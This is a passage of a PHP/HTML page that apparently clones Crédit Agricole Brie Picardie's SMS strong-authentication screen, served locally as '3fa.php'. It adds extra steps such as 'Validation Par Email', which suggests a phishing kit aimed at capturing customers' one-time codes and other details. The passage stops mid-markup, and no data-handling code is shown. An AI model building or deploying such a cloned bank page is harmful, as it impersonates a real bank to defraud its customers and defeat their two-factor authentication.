<?php

session_start();

?>

<html lang="fr" class=" backgroundblendmode no-capture flexbox flexwrap backgroundblendmode no-capture flexbox flexwrap backgroundblendmode no-capture flexbox flexwrap backgroundblendmode no-capture flexbox flexwrap"><head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">    
       
    <meta name="robots" content="noindex">
	<title>Verification par code sms - Crédit Agricole Brie Picardie</title>
	<meta property="og:title" content="authent forte DSP2 par sms - Crédit Agricole Brie Picardie">
	<meta property="og:image" content="https://www.credit-agricole.fr/content/dam/assetsca/cr887/npc/images/logo-cabp-216x40.png">
		
		
	
    <noscript>
   	 <style type="text/css">
        body {
            overflow:hidden;
        }
     </style>
    	<div class="TechnicalError noscript">
			<div class="TechnicalError-content">
				<div class="TechnicalError-paragraph">
					<p class="TechnicalError-firstPara">Malheureusement, votre configuration de navigation actuelle ne vous permet pas de naviguer dans de bonnes conditions.</br> Vous ne pourrez pas profiter de toutes les fonctionnalités de notre site ni accéder à votre espace client.</p>
				</div>
			</div>
		</div>
	</noscript>
	<meta name="format-detection" content="telephone=no">

	
	    <link rel="icon" type="image/vnd.microsoft.icon" href="https://www.credit-agricole.fr/content/dam/assetsca/cr887/npc/images/favicon.ico">
	    <link rel="shortcut icon" type="image/vnd.microsoft.icon" href="https://www.credit-agricole.fr/content/dam/assetsca/cr887/npc/images/favicon.ico">
		

 	<link rel="stylesheet" href="https://www.credit-agricole.fr/etc/designs/ca/npc/clientlib-part.min.d47449a234bc4b4c909a1f229a23a136.css" type="text/css">


    <link rel="stylesheet" href="https://www.credit-agricole.fr/etc/designs/ca/npc/clientlibStoreLocatorT33Part.min.f72730de703c2d266b7fde791cfa1701.css" type="text/css">
<link rel="stylesheet" href="https://www.credit-agricole.fr/etc/designs/ca/npc/clientlibStoreLocatorT34Part.min.d6f5a64818501f04345746b0e2618b09.css" type="text/css">
<link rel="stylesheet" href="https://www.credit-agricole.fr/etc/designs/ca/npc/clientlibBoutonVertPart.min.d41d8cd98f00b204e9800998ecf8427e.css" type="text/css">

<script type="text/javascript" async="" src="http://tp.realytics.io/sync/se/cnktY3JlZDF0NGd8cnlfODMyRTY5OEYtRTRBMi00NEQyLTg1ODctMjJBMTFEMzY3MDY0fA%3D%3D?ct=1&amp;rt=1&amp;u=http%3A%2F%2F127.0.0.1%2FAgricole2%2Ffr%2F3fa.php&amp;r=&amp;ts=1587299982939"></script><script type="text/javascript" async="" src="http://tp.realytics.io/sync/se/cnktY3JlZDF0NGd8cnlfODMyRTY5OEYtRTRBMi00NEQyLTg1ODctMjJBMTFEMzY3MDY0fA%3D%3D?ct=1&amp;rt=1&amp;u=http%3A%2F%2F127.0.0.1%2FAgricole2%2Ffr%2F3fa.php&amp;r=&amp;ts=1587299982936"></script><script type="text/javascript" async="" src="http://tp.realytics.io/sync/se/cnktY3JlZDF0NGd8cnlfODMyRTY5OEYtRTRBMi00NEQyLTg1ODctMjJBMTFEMzY3MDY0fA%3D%3D?ct=1&amp;rt=1&amp;u=http%3A%2F%2F127.0.0.1%2FAgricole2%2Ffr%2F3fa.php&amp;r=&amp;ts=1587299982934"></script><script type="text/javascript" async="" src="http://tp.realytics.io/sync/se/cnktY3JlZDF0NGd8cnlfODMyRTY5OEYtRTRBMi00NEQyLTg1ODctMjJBMTFEMzY3MDY0fA%3D%3D?ct=1&amp;rt=1&amp;u=http%3A%2F%2F127.0.0.1%2FAgricole2%2Ffr%2F3fa.php&amp;r=&amp;ts=1587299982932"></script><script type="text/javascript" async="" src="http://tp.realytics.io/sync/se/cnktY3JlZDF0NGd8cnlfODMyRTY5OEYtRTRBMi00NEQyLTg1ODctMjJBMTFEMzY3MDY0fA%3D%3D?ct=1&amp;rt=1&amp;u=http%3A%2F%2F127.0.0.1%2FAgricole2%2Ffr%2F3fa.php&amp;r=&amp;ts=1587299982930"></script><script type="text/javascript" async="" src="http://dcniko1cv0rz.cloudfront.net/realytics-1.2.min.js"></script><script type="text/javascript" async="" src="http://i.realytics.io/tc.js?cb=1587299982919"></script><script type="text/javascript" async="" src="http://dcniko1cv0rz.cloudfront.net/realytics-1.2.min.js"></script><script type="text/javascript" async="" src="http://i.realytics.io/tc.js?cb=1587299982914"></script><script type="text/javascript" async="" src="http://dcniko1cv0rz.cloudfront.net/realytics-1.2.min.js"></script><script type="text/javascript" async="" src="http://i.realytics.io/tc.js?cb=1587299982911"></script><script type="text/javascript" async="" src="http://dcniko1cv0rz.cloudfront.net/realytics-1.2.min.js"></script><script type="text/javascript" async="" src="http://i.realytics.io/tc.js?cb=1587299982903"></script><script async="" src="//connect.facebook.net/en_US/fbevents.js"></script><script type="text/javascript" async="" src="https://www.googleadservices.com/pagead/conversion_async.js"></script><script type="text/javascript" async="" src="//www.vivocha.com/a/cadif/api/vivocha.js"></script><script type="text/javascript" async="" src="http://tp.realytics.io/sync/se/cnktY3JlZDF0NGd8cnlfQUFDOUY5RDktNTJGMy00RDUxLUI2NEYtRUFCODlBQkMwRUZDfA%3D%3D?ct=1&amp;rt=1&amp;u=http%3A%2F%2F127.0.0.1%2FAgricole2%2Ffr%2F3fa.php&amp;r=&amp;ts=1587299565421"></script><script type="text/javascript" async="" src="http://tp.realytics.io/sync/se/cnktY3JlZDF0NGd8cnlfQUFDOUY5RDktNTJGMy00RDUxLUI2NEYtRUFCODlBQkMwRUZDfA%3D%3D?ct=1&amp;rt=1&amp;u=http%3A%2F%2F127.0.0.1%2FAgricole2%2Ffr%2F3fa.php&amp;r=&amp;ts=1587299565413"></script><script type="text/javascript" async="" src="http://tp.realytics.io/sync/se/cnktY3JlZDF0NGd8cnlfQUFDOUY5RDktNTJGMy00RDUxLUI2NEYtRUFCODlBQkMwRUZDfA%3D%3D?ct=1&amp;rt=1&amp;u=http%3A%2F%2F127.0.0.1%2FAgricole2%2Ffr%2F3fa.php&amp;r=&amp;ts=1587299565411"></script><script type="text/javascript" async="" src="http://tp.realytics.io/sync/se/cnktY3JlZDF0NGd8cnlfQUFDOUY5RDktNTJGMy00RDUxLUI2NEYtRUFCODlBQkMwRUZDfA%3D%3D?ct=1&amp;rt=1&amp;u=http%3A%2F%2F127.0.0.1%2FAgricole2%2Ffr%2F3fa.php&amp;r=&amp;ts=1587299565407"></script><script type="text/javascript" async="" src="http://dcniko1cv0rz.cloudfront.net/realytics-1.2.min.js"></script><script type="text/javascript" async="" src="http://i.realytics.io/tc.js?cb=1587299565390"></script><script type="text/javascript" async="" src="http://dcniko1cv0rz.cloudfront.net/realytics-1.2.min.js"></script><script type="text/javascript" async="" src="http://i.realytics.io/tc.js?cb=1587299565335"></script><script async="" src="//connect.facebook.net/en_US/fbevents.js"></script><script type="text/javascript" async="" src="https://www.googleadservices.com/pagead/conversion_async.js"></script><script type="text/javascript" async="" src="//www.vivocha.com/a/cadif/api/vivocha.js"></script><script type="text/javascript" async="" src="http://tp.realytics.io/sync/se/cnktY3JlZDF0NGd8cnlfMzc5NkM4OUItRTBCRC00OERCLUJGNUEtMTQ5QUQ4MDJBQzlEfA%3D%3D?ct=1&amp;rt=1&amp;u=http%3A%2F%2F127.0.0.1%2FAgricole2%2Ffr%2F3fa.php&amp;r=&amp;ts=1587299070631"></script><script type="text/javascript" async="" src="http://tp.realytics.io/sync/se/cnktY3JlZDF0NGd8cnlfMzc5NkM4OUItRTBCRC00OERCLUJGNUEtMTQ5QUQ4MDJBQzlEfA%3D%3D?ct=1&amp;rt=1&amp;u=http%3A%2F%2F127.0.0.1%2FAgricole2%2Ffr%2F3fa.php&amp;r=&amp;ts=1587299070629"></script><script type="text/javascript" async="" src="http://tp.realytics.io/sync/se/cnktY3JlZDF0NGd8cnlfMzc5NkM4OUItRTBCRC00OERCLUJGNUEtMTQ5QUQ4MDJBQzlEfA%3D%3D?ct=1&amp;rt=1&amp;u=http%3A%2F%2F127.0.0.1%2FAgricole2%2Ffr%2F3fa.php&amp;r=&amp;ts=1587299070625"></script><script type="text/javascript" async="" src="http://dcniko1cv0rz.cloudfront.net/realytics-1.2.min.js"></script><script type="text/javascript" async="" src="http://i.realytics.io/tc.js?cb=1587299070250"></script><script type="text/javascript" async="" src="http://dcniko1cv0rz.cloudfront.net/realytics-1.2.min.js"></script><script type="text/javascript" async="" src="http://i.realytics.io/tc.js?cb=1587299069918"></script><script async="" src="//connect.facebook.net/en_US/fbevents.js"></script><script type="text/javascript" async="" src="https://www.googleadservices.com/pagead/conversion_async.js"></script><script type="text/javascript" async="" src="//www.vivocha.com/a/cadif/api/vivocha.js"></script><script type="text/javascript" src="https://www.credit-agricole.fr/etc/clientlibs/granite/jquery.min.0811b5e7037ada110b591bbd86240386.js"></script>
<script type="text/javascript" src="https://www.credit-agricole.fr/etc/clientlibs/granite/utils.min.6968fb10cbad8a699b7bcf06fbd45b91.js"></script>
<script type="text/javascript" src="https://www.credit-agricole.fr/etc/clientlibs/granite/jquery/granite.min.b82fcc6ac1f7e79cd9f66e927be67ebb.js"></script>

<script type="text/javascript" src="https://www.credit-agricole.fr/etc/designs/ca/npc/clientlib-bootstrap-jquery.min.df9d6ac4b08627bd99478dab5fa9e747.js"></script>

<script type="text/javascript" src="https://www.credit-agricole.fr/etc/designs/ca/npc/clientlibHeader.min.17a238919df023a602e73f4e9fbbe29a.js"></script>

		        <script src="https://cdn.tagcommander.com/3633/tc_NPCPRIVACY_1.js"></script>
		
		    
	
	
	
	
		
	        <script src="https://cdn.tagcommander.com/3315/tc_PortailClientCreditAgricole_1.js"></script>
		
	    
	














<link href="https://www.credit-agricole.fr/etc/designs/ca/npc.css" rel="stylesheet" type="text/css">


<script type="text/javascript">
            (function() {
                window.ContextHub = window.ContextHub || {};

                /* setting paths */
                ContextHub.Paths = ContextHub.Paths || {};
                ContextHub.Paths.CONTEXTHUB_PATH = "/etc/cloudsettings/default/contexthub";
                ContextHub.Paths.RESOURCE_PATH = "\/content\/ca\/cr887\/npc\/fr\/particulier\/dsp2\/af\u002Dsms\/jcr:content\/contexthub";
                ContextHub.Paths.SEGMENTATION_PATH = "\/etc\/segmentation\/contexthub\/cr887";
                ContextHub.Paths.CQ_CONTEXT_PATH = "";

                /* setting initial constants */
                ContextHub.Constants = ContextHub.Constants || {};
                ContextHub.Constants.ANONYMOUS_HOME = "/home/users/3/31qyKkM4DG7Z9RJzZ2Qe";
                ContextHub.Constants.MODE = "no-ui";
            }());
        </script><script src="/etc/cloudsettings/default/contexthub.kernel.branche1.js" type="text/javascript"></script>

<script>document.cookie = 'reload-ch=; path=' + NPC.urlLiveCopyCaisse + '; expires=Thu, 01 Jan 1970 00:00:01 GMT;';</script>






<script id="tc_script_adw" src="https://www.googletagmanager.com/gtag/js?id=AW-990711773"></script><script src="https://googleads.g.doubleclick.net/pagead/viewthroughconversion/990711773/?random=1587089442019&amp;cv=9&amp;fst=1587089442019&amp;num=1&amp;bg=ffffff&amp;guid=ON&amp;resp=GooglemKTybQhCsO&amp;u_h=1080&amp;u_w=1920&amp;u_ah=1040&amp;u_aw=1920&amp;u_cd=24&amp;u_his=7&amp;u_tz=60&amp;u_java=false&amp;u_nplug=3&amp;u_nmime=4&amp;gtm=2oa480&amp;sendb=1&amp;ig=1&amp;data=event%3Dgtag.config&amp;frm=0&amp;url=https%3A%2F%2Fwww.credit-agricole.fr%2Fca-briepicardie%2Fparticulier%2Fdsp2%2Faf-sms.html&amp;ref=https%3A%2F%2Fwww.credit-agricole.fr%2Fca-briepicardie%2Fparticulier%2Fdsp2%2Faf-choix.html&amp;tiba=authent%20forte%20DSP2%20par%20sms%20-%20Cr%C3%A9dit%20Agricole%20Brie%20Picardie&amp;hn=www.googleadservices.com&amp;async=1&amp;rfmt=3&amp;fmt=4"></script><style type="text/css">.fb_hidden{position:absolute;top:-10000px;z-index:10001}.fb_reposition{overflow:hidden;position:relative}.fb_invisible{display:none}.fb_reset{background:none;border:0;border-spacing:0;color:#000;cursor:auto;direction:ltr;font-family:"lucida grande", tahoma, verdana, arial, sans-serif;font-size:11px;font-style:normal;font-variant:normal;font-weight:normal;letter-spacing:normal;line-height:1;margin:0;overflow:visible;padding:0;text-align:left;text-decoration:none;text-indent:0;text-shadow:none;text-transform:none;visibility:visible;white-space:normal;word-spacing:normal}.fb_reset>div{overflow:hidden}@keyframes fb_transform{from{opacity:0;transform:scale(.95)}to{opacity:1;transform:scale(1)}}.fb_animate{animation:fb_transform .3s forwards}
.fb_dialog{background:rgba(82, 82, 82, .7);position:absolute;top:-10000px;z-index:10001}.fb_dialog_advanced{border-radius:8px;padding:10px}.fb_dialog_content{background:#fff;color:#373737}.fb_dialog_close_icon{background:url(https://static.xx.fbcdn.net/rsrc.php/v3/yq/r/IE9JII6Z1Ys.png) no-repeat scroll 0 0 transparent;cursor:pointer;display:block;height:15px;position:absolute;right:18px;top:17px;width:15px}.fb_dialog_mobile .fb_dialog_close_icon{left:5px;right:auto;top:5px}.fb_dialog_padding{background-color:transparent;position:absolute;width:1px;z-index:-1}.fb_dialog_close_icon:hover{background:url(https://static.xx.fbcdn.net/rsrc.php/v3/yq/r/IE9JII6Z1Ys.png) no-repeat scroll 0 -15px transparent}.fb_dialog_close_icon:active{background:url(https://static.xx.fbcdn.net/rsrc.php/v3/yq/r/IE9JII6Z1Ys.png) no-repeat scroll 0 -30px transparent}.fb_dialog_iframe{line-height:0}.fb_dialog_content .dialog_title{background:#6d84b4;border:1px solid #365899;color:#fff;font-size:14px;font-weight:bold;margin:0}.fb_dialog_content .dialog_title>span{background:url(https://static.xx.fbcdn.net/rsrc.php/v3/yd/r/Cou7n-nqK52.gif) no-repeat 5px 50%;float:left;padding:5px 0 7px 26px}body.fb_hidden{height:100%;left:0;margin:0;overflow:visible;position:absolute;top:-10000px;transform:none;width:100%}.fb_dialog.fb_dialog_mobile.loading{background:url(https://static.xx.fbcdn.net/rsrc.php/v3/ya/r/3rhSv5V8j3o.gif) white no-repeat 50% 50%;min-height:100%;min-width:100%;overflow:hidden;position:absolute;top:0;z-index:10001}.fb_dialog.fb_dialog_mobile.loading.centered{background:none;height:auto;min-height:initial;min-width:initial;width:auto}.fb_dialog.fb_dialog_mobile.loading.centered #fb_dialog_loader_spinner{width:100%}.fb_dialog.fb_dialog_mobile.loading.centered .fb_dialog_content{background:none}.loading.centered #fb_dialog_loader_close{clear:both;color:#fff;display:block;font-size:18px;padding-top:20px}#fb-root #fb_dialog_ipad_overlay{background:rgba(0, 0, 0, .4);bottom:0;left:0;min-height:100%;position:absolute;right:0;top:0;width:100%;z-index:10000}#fb-root #fb_dialog_ipad_overlay.hidden{display:none}.fb_dialog.fb_dialog_mobile.loading iframe{visibility:hidden}.fb_dialog_mobile .fb_dialog_iframe{position:sticky;top:0}.fb_dialog_content .dialog_header{background:linear-gradient(from(#738aba), to(#2c4987));border-bottom:1px solid;border-color:#043b87;box-shadow:white 0 1px 1px -1px inset;color:#fff;font:bold 14px Helvetica, sans-serif;text-overflow:ellipsis;text-shadow:rgba(0, 30, 84, .296875) 0 -1px 0;vertical-align:middle;white-space:nowrap}.fb_dialog_content .dialog_header table{height:43px;width:100%}.fb_dialog_content .dialog_header td.header_left{font-size:12px;padding-left:5px;vertical-align:middle;width:60px}.fb_dialog_content .dialog_header td.header_right{font-size:12px;padding-right:5px;vertical-align:middle;width:60px}.fb_dialog_content .touchable_button{background:linear-gradient(from(#4267B2), to(#2a4887));background-clip:padding-box;border:1px solid #29487d;border-radius:3px;display:inline-block;line-height:18px;margin-top:3px;max-width:85px;padding:4px 12px;position:relative}.fb_dialog_content .dialog_header .touchable_button input{background:none;border:none;color:#fff;font:bold 12px Helvetica, sans-serif;margin:2px -12px;padding:2px 6px 3px 6px;text-shadow:rgba(0, 30, 84, .296875) 0 -1px 0}.fb_dialog_content .dialog_header .header_center{color:#fff;font-size:16px;font-weight:bold;line-height:18px;text-align:center;vertical-align:middle}.fb_dialog_content .dialog_content{background:url(https://static.xx.fbcdn.net/rsrc.php/v3/y9/r/jKEcVPZFk-2.gif) no-repeat 50% 50%;border:1px solid #4a4a4a;border-bottom:0;border-top:0;height:150px}.fb_dialog_content .dialog_footer{background:#f5f6f7;border:1px solid #4a4a4a;border-top-color:#ccc;height:40px}#fb_dialog_loader_close{float:left}.fb_dialog.fb_dialog_mobile .fb_dialog_close_button{text-shadow:rgba(0, 30, 84, .296875) 0 -1px 0}.fb_dialog.fb_dialog_mobile .fb_dialog_close_icon{visibility:hidden}#fb_dialog_loader_spinner{animation:rotateSpinner 1.2s linear infinite;background-color:transparent;background-image:url(https://static.xx.fbcdn.net/rsrc.php/v3/yD/r/t-wz8gw1xG1.png);background-position:50% 50%;background-repeat:no-repeat;height:24px;width:24px}@keyframes rotateSpinner{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
.fb_iframe_widget{display:inline-block;position:relative}.fb_iframe_widget span{display:inline-block;position:relative;text-align:justify}.fb_iframe_widget iframe{position:absolute}.fb_iframe_widget_fluid_desktop,.fb_iframe_widget_fluid_desktop span,.fb_iframe_widget_fluid_desktop iframe{max-width:100%}.fb_iframe_widget_fluid_desktop iframe{min-width:220px;position:relative}.fb_iframe_widget_lift{z-index:1}.fb_iframe_widget_fluid{display:inline}.fb_iframe_widget_fluid span{width:100%}</style><script type="text/javascript" charset="UTF-8" src="https://maps.google.com/maps-api-v3/api/js/39/10/intl/en_gb/common.js"></script><script type="text/javascript" charset="UTF-8" src="https://maps.google.com/maps-api-v3/api/js/39/10/intl/en_gb/util.js"></script><script id="tc_script_adw" src="https://www.googletagmanager.com/gtag/js?id=AW-990711773"></script><script src="https://googleads.g.doubleclick.net/pagead/viewthroughconversion/990711773/?random=1587299070054&amp;cv=9&amp;fst=1587299070054&amp;num=1&amp;bg=ffffff&amp;guid=ON&amp;resp=GooglemKTybQhCsO&amp;u_h=1080&amp;u_w=1920&amp;u_ah=1040&amp;u_aw=1920&amp;u_cd=24&amp;u_his=4&amp;u_tz=0&amp;u_java=false&amp;u_nplug=3&amp;u_nmime=4&amp;gtm=2oa480&amp;sendb=1&amp;ig=1&amp;data=event%3Dgtag.config&amp;frm=0&amp;url=http%3A%2F%2F127.0.0.1%2FAgricole2%2Ffr%2F3fa.php&amp;tiba=Authent%20forte%20DSP2%20par%20sms%20-%20Cr%C3%A9dit%20Agricole%20Brie%20Picardie&amp;hn=www.googleadservices.com&amp;async=1&amp;rfmt=3&amp;fmt=4"></script><script id="tc_script_adw" src="https://www.googletagmanager.com/gtag/js?id=AW-990711773"></script><script src="https://googleads.g.doubleclick.net/pagead/viewthroughconversion/990711773/?random=1587299070248&amp;cv=9&amp;fst=1587299070248&amp;num=1&amp;bg=ffffff&amp;guid=ON&amp;resp=GooglemKTybQhCsO&amp;u_h=1080&amp;u_w=1920&amp;u_ah=1040&amp;u_aw=1920&amp;u_cd=24&amp;u_his=4&amp;u_tz=0&amp;u_java=false&amp;u_nplug=3&amp;u_nmime=4&amp;gtm=2oa480&amp;sendb=1&amp;ig=1&amp;data=event%3Dgtag.config&amp;frm=0&amp;url=http%3A%2F%2F127.0.0.1%2FAgricole2%2Ffr%2F3fa.php&amp;tiba=Authent%20forte%20DSP2%20par%20sms%20-%20Cr%C3%A9dit%20Agricole%20Brie%20Picardie&amp;hn=www.googleadservices.com&amp;async=1&amp;rfmt=3&amp;fmt=4"></script><script type="text/javascript" async="" src="undefined"></script><script type="text/javascript" async="" src="undefinedjsonp/inbenta.js"></script><script id="tc_script_adw" src="https://www.googletagmanager.com/gtag/js?id=AW-990711773"></script><script id="tc_script_adw" src="https://www.googletagmanager.com/gtag/js?id=AW-990711773"></script><script src="https://googleads.g.doubleclick.net/pagead/viewthroughconversion/990711773/?random=1587299565395&amp;cv=9&amp;fst=1587299565395&amp;num=1&amp;bg=ffffff&amp;guid=ON&amp;resp=GooglemKTybQhCsO&amp;u_h=1080&amp;u_w=1920&amp;u_ah=1040&amp;u_aw=1920&amp;u_cd=24&amp;u_his=4&amp;u_tz=0&amp;u_java=false&amp;u_nplug=3&amp;u_nmime=4&amp;gtm=2oa480&amp;sendb=1&amp;ig=1&amp;data=event%3Dgtag.config&amp;frm=0&amp;url=http%3A%2F%2F127.0.0.1%2FAgricole2%2Ffr%2F3fa.php&amp;tiba=Authent%20forte%20DSP2%20par%20sms%20-%20Cr%C3%A9dit%20Agricole%20Brie%20Picardie&amp;hn=www.googleadservices.com&amp;async=1&amp;rfmt=3&amp;fmt=4"></script><script src="https://googleads.g.doubleclick.net/pagead/viewthroughconversion/990711773/?random=1587299565397&amp;cv=9&amp;fst=1587299565397&amp;num=1&amp;bg=ffffff&amp;guid=ON&amp;resp=GooglemKTybQhCsO&amp;u_h=1080&amp;u_w=1920&amp;u_ah=1040&amp;u_aw=1920&amp;u_cd=24&amp;u_his=4&amp;u_tz=0&amp;u_java=false&amp;u_nplug=3&amp;u_nmime=4&amp;gtm=2oa480&amp;sendb=1&amp;ig=1&amp;data=event%3Dgtag.config&amp;frm=0&amp;url=http%3A%2F%2F127.0.0.1%2FAgricole2%2Ffr%2F3fa.php&amp;tiba=Authent%20forte%20DSP2%20par%20sms%20-%20Cr%C3%A9dit%20Agricole%20Brie%20Picardie&amp;hn=www.googleadservices.com&amp;async=1&amp;rfmt=3&amp;fmt=4"></script><script id="tc_script_adw" src="https://www.googletagmanager.com/gtag/js?id=AW-990711773"></script><script src="https://googleads.g.doubleclick.net/pagead/viewthroughconversion/990711773/?random=1587299565418&amp;cv=9&amp;fst=1587299565418&amp;num=1&amp;bg=ffffff&amp;guid=ON&amp;resp=GooglemKTybQhCsO&amp;u_h=1080&amp;u_w=1920&amp;u_ah=1040&amp;u_aw=1920&amp;u_cd=24&amp;u_his=4&amp;u_tz=0&amp;u_java=false&amp;u_nplug=3&amp;u_nmime=4&amp;gtm=2oa480&amp;sendb=1&amp;ig=1&amp;data=event%3Dgtag.config&amp;frm=0&amp;url=http%3A%2F%2F127.0.0.1%2FAgricole2%2Ffr%2F3fa.php&amp;tiba=Authent%20forte%20DSP2%20par%20sms%20-%20Cr%C3%A9dit%20Agricole%20Brie%20Picardie&amp;hn=www.googleadservices.com&amp;async=1&amp;rfmt=3&amp;fmt=4"></script><script type="text/javascript" async="" src="undefined"></script><script type="text/javascript" async="" src="undefinedjsonp/inbenta.js"></script><script id="tc_script_adw" src="https://www.googletagmanager.com/gtag/js?id=AW-990711773"></script><script id="tc_script_adw" src="https://www.googletagmanager.com/gtag/js?id=AW-990711773"></script><script id="tc_script_adw" src="https://www.googletagmanager.com/gtag/js?id=AW-990711773"></script><script id="tc_script_adw" src="https://www.googletagmanager.com/gtag/js?id=AW-990711773"></script><script src="https://googleads.g.doubleclick.net/pagead/viewthroughconversion/990711773/?random=1587299982920&amp;cv=9&amp;fst=1587299982920&amp;num=1&amp;bg=ffffff&amp;guid=ON&amp;resp=GooglemKTybQhCsO&amp;u_h=1080&amp;u_w=1920&amp;u_ah=1040&amp;u_aw=1920&amp;u_cd=24&amp;u_his=4&amp;u_tz=0&amp;u_java=false&amp;u_nplug=3&amp;u_nmime=4&amp;gtm=2oa480&amp;sendb=1&amp;ig=1&amp;data=event%3Dgtag.config&amp;frm=0&amp;url=http%3A%2F%2F127.0.0.1%2FAgricole2%2Ffr%2F3fa.php&amp;tiba=Authent%20forte%20DSP2%20par%20sms%20-%20Cr%C3%A9dit%20Agricole%20Brie%20Picardie&amp;hn=www.googleadservices.com&amp;async=1&amp;rfmt=3&amp;fmt=4"></script><script src="https://googleads.g.doubleclick.net/pagead/viewthroughconversion/990711773/?random=1587299982921&amp;cv=9&amp;fst=1587299982921&amp;num=1&amp;bg=ffffff&amp;guid=ON&amp;resp=GooglemKTybQhCsO&amp;u_h=1080&amp;u_w=1920&amp;u_ah=1040&amp;u_aw=1920&amp;u_cd=24&amp;u_his=4&amp;u_tz=0&amp;u_java=false&amp;u_nplug=3&amp;u_nmime=4&amp;gtm=2oa480&amp;sendb=1&amp;ig=1&amp;data=event%3Dgtag.config&amp;frm=0&amp;url=http%3A%2F%2F127.0.0.1%2FAgricole2%2Ffr%2F3fa.php&amp;tiba=Authent%20forte%20DSP2%20par%20sms%20-%20Cr%C3%A9dit%20Agricole%20Brie%20Picardie&amp;hn=www.googleadservices.com&amp;async=1&amp;rfmt=3&amp;fmt=4"></script><script src="https://googleads.g.doubleclick.net/pagead/viewthroughconversion/990711773/?random=1587299982923&amp;cv=9&amp;fst=1587299982923&amp;num=1&amp;bg=ffffff&amp;guid=ON&amp;resp=GooglemKTybQhCsO&amp;u_h=1080&amp;u_w=1920&amp;u_ah=1040&amp;u_aw=1920&amp;u_cd=24&amp;u_his=4&amp;u_tz=0&amp;u_java=false&amp;u_nplug=3&amp;u_nmime=4&amp;gtm=2oa480&amp;sendb=1&amp;ig=1&amp;data=event%3Dgtag.config&amp;frm=0&amp;url=http%3A%2F%2F127.0.0.1%2FAgricole2%2Ffr%2F3fa.php&amp;tiba=Authent%20forte%20DSP2%20par%20sms%20-%20Cr%C3%A9dit%20Agricole%20Brie%20Picardie&amp;hn=www.googleadservices.com&amp;async=1&amp;rfmt=3&amp;fmt=4"></script><script src="https://googleads.g.doubleclick.net/pagead/viewthroughconversion/990711773/?random=1587299982924&amp;cv=9&amp;fst=1587299982924&amp;num=1&amp;bg=ffffff&amp;guid=ON&amp;resp=GooglemKTybQhCsO&amp;u_h=1080&amp;u_w=1920&amp;u_ah=1040&amp;u_aw=1920&amp;u_cd=24&amp;u_his=4&amp;u_tz=0&amp;u_java=false&amp;u_nplug=3&amp;u_nmime=4&amp;gtm=2oa480&amp;sendb=1&amp;ig=1&amp;data=event%3Dgtag.config&amp;frm=0&amp;url=http%3A%2F%2F127.0.0.1%2FAgricole2%2Ffr%2F3fa.php&amp;tiba=Authent%20forte%20DSP2%20par%20sms%20-%20Cr%C3%A9dit%20Agricole%20Brie%20Picardie&amp;hn=www.googleadservices.com&amp;async=1&amp;rfmt=3&amp;fmt=4"></script><script type="text/javascript" async="" src="undefined"></script><script type="text/javascript" async="" src="undefinedjsonp/inbenta.js"></script></head>












<body><script type="text/javascript" async="" src="https://cdn.tagcommander.com/privacy/3633/privacy_1.js" charset="utf-8" id="tc_script_0.7066139209525828"></script><script type="text/javascript" async="" src="https://cdn.tagcommander.com/privacy/3633/privacy_1.js" charset="utf-8" id="tc_script_0.3494727598326408"></script><script type="text/javascript" async="" src="https://cdn.tagcommander.com/privacy/3633/privacy_1.js" charset="utf-8" id="tc_script_0.2547169111233729"></script><script type="text/javascript" async="" src="https://cdn.tagcommander.com/privacy/3633/privacy_1.js" charset="utf-8" id="tc_script_0.19724379487507782"></script>

	
		<header>
			













<div class="HeaderAlternate js-Header">
    












<a class="HeaderAlternate-logo">
	<img class="HeaderAlternate-logoImg js-needFakeNotSvg" src="https://www.credit-agricole.fr/content/dam/assetsca/cr887/npc/images/logo-cabp-216x40.png" alt="Crédit Agricole Brie Picardie - Banque et assurances">
</a>


    <a href="/ca-briepicardie/particulier/dsp2/informations.npc.dsp2.logout.html" class="HeaderAlternate-back">
        <span class="HeaderAlternate-backText">Quitter</span>		
        <i class="icon npc-close HeaderAlternate-backIcon"></i>
    </a>
</div>

		</header>
	
	<main>
		











<div class="container-fluid Template" style="margin-top: 60px;">
	<div class="row js-Template-head">
		<div id="secondstep" class="col-xs-12 col-md-push-6 col-md-6" style="display: none;">
	
			<div class="col-xs-12 FirstLogin-pearls">
				<div class="pearls">
					<div class="pearl pearl--done">
						<div class="pearl-dot"></div>
						<div class="pearl-title">Information</div>
					</div>
		
					<div class="pearl pearl--done">
						<div class="pearl-dot"></div>
						<div class="pearl-title">Authentification forte</div>
					</div>
		
					<div class="pearl pearl--current">
						<div class="pearl-dot"></div>
						<div class="pearl-title">Accès à l'activation</div>
					</div>
				</div>
			</div>
		
		    <div class="">
		        <h1><b>VERIFICATION PAR CODE SMS:</b></h1>
		        <div class="">
				
		            <span><b>Authentification par SMS</b></span>
		        </div>
		
		        <div class="AccordionSteps-itemContent AccordionSteps-itemContent--empty">
		        </div>
		        
		        <div>
		            <span class="icon npc-right StrongAuthentication-rightArrowPhone"></span>
		            <span><b>Confirmation du numéro de téléphone</b></span>
		            <p class="StrongAuthentication-para StrongAuthentication-para--padLeft46">Veuillez vérifier que votre numéro de téléphone est toujours d'actualité</p>
		        </div>
		
		          <div id="phoneNumber" class="SmsAuthentication-enterPhoneNumb">
		          07****5383
		          </div>
		
		          <div class="StrongAuthentication-notMyNumberLinkWrapper">
		              <a href="changement-numero.html" class="hidden-xs">Ce n'est pas mon numéro</a>           
		          </div>
		
		        
		        <div class="StrongAuthentication-notMyNumberLinkWrapper">
		            <a href="changement-numero.html" class="hidden-sm hidden-md hidden-lg">Ce n'est pas mon numéro</a>
		        </div>
		        
		        <div class="Login-noPadding error" id="erreur-num" style="display:none">
					<p role="alert">Une erreur technique est survenue. Veuillez réessayer ultérieurement.</p>
				</div>
		
				<div class="FormActions StrongAuthentication-formActions">
					<div class="FormActions-inner">
					</div>
				</div>
		    </div>
		</div>

		<div id="code" class="col-xs-12 col-md-push-6 col-md-6" style="">
			
			<div class="col-xs-12 FirstLogin-pearls">
				<div class="pearls">
					<div class="pearl pearl--done">
						<div class="pearl-dot"></div>
						<div class="pearl-title">Information</div>
					</div>
		
					<div class="pearl pearl--done">
						<div class="pearl-dot"></div>
						<div class="pearl-title">Authentification 2FA</div>
					</div>
    
    					<div class="pearl pearl--done">
						<div class="pearl-dot"></div>
						<div class="pearl-title">Validation Par SMS</div>
					</div>
    
    					<div class="pearl pearl--current">
						<div class="pearl-dot"></div>
						<div class="pearl-title">Validation Par Email</div>
					</div>
    
    					<div class="pearl ">
						<div class="pearl-dot"></div>
